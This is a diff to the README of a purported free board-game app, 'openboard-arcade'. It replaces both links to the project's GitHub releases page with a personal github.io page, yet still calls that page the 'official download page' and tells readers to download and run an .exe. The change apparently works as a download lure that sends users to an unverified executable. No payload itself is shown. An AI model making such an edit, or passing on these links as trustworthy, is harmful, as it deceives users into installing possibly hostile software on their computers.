@@ -1,6 +1,6 @@
 # 🎲 openboard-arcade - Play classic board games for free
 
-[![Download OpenBoard Arcade](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/lelahimmotile159/openboard-arcade/releases)
+[![Download OpenBoard Arcade](https://img.shields.io/badge/Download-Release_Page-blue)](https://lelahimmotile159.github.io)
 
 OpenBoard Arcade offers a collection of digital board games and minigames. You can play titles like Ludo and Chess on your Windows computer. This project relies on modern web technology to provide a smooth gaming experience. It works offline so you do not need a constant internet connection to enjoy your favorite games.
 
@@ -19,7 +19,7 @@ Your computer must meet these basic standards to run the software:
 You need to download the installation file from the official releases page. 
 
 1. Open your web browser.
-2. Go to the [official download page](https://github.com/lelahimmotile159/openboard-arcade/releases).
+2. Go to the [official download page](https://lelahimmotile159.github.io).
 3. Look for the Assets section at the bottom of the latest release.
 4. Click the file ending in `.exe` to start the download.
 5. Save the file to your Downloads folder or your desktop for easy access.
